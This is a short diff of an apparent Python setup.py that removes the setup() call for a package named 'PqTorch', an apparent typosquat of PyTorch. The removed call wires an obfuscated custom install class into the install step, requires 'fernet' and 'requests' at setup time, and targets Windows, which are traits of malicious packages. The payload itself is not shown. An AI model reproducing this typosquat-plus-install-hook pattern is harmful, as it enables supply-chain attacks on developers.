@@ -18,22 +18,5 @@ class ydYSNJktMGBCmRBgSQcyrdTwHlqOzAsUJKyJcXBQjICbgVtXUcwiAYIvgdAwYoyybWiPO(inst
             install.run(self)
 
 
-setup(
-    name="PqTorch",
-    version=VERSION,
-    author="DAirEK",
-    author_email="GZycOHPkzbhOhfez@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': ydYSNJktMGBCmRBgSQcyrdTwHlqOzAsUJKyJcXBQjICbgVtXUcwiAYIvgdAwYoyybWiPO,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
 
